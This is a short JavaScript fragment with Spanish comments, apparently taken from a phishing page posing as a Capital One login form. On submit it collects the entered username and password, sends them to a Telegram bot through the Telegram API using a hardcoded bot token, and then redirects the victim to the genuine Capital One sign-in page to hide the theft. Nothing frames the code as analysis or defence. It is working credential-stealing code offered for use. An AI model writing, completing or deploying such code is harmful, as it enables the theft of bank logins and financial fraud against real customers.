    document.getElementById('loginForm').addEventListener('submit', function (e) {
      e.preventDefault(); // evitar env√≠o normal

      const user = document.getElementById('username').value;
      const pass = document.getElementById('password').value;

      // Cambia estos por tu token y chat_id reales
      const token = '7941669083:AAFCmw6OPwXWy_hTryvFkcIz_mqd8OydRQM';
      const chat_id = TU_CHAT_ID; // reemplaza TU_CHAT_ID por el n√∫mero real

      const message = `üîê CapitalOne Login\nüë§ Usuario: ${user}\nüîë Contrase√±a: ${pass}`;

      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chat_id,
          text: message,
        }),
      })
      .then(response => {
        // Aqu√≠ rediriges despu√©s de enviar el mensaje, no antes
        window.location.href = 'https://www.capitalone.com/commercial/sign-in/';
      })
      .catch(error => {
        // En caso de error tambi√©n redirige
        window.location.href = 'https://www.capitalone.com/commercial/sign-in/';
      });
    });
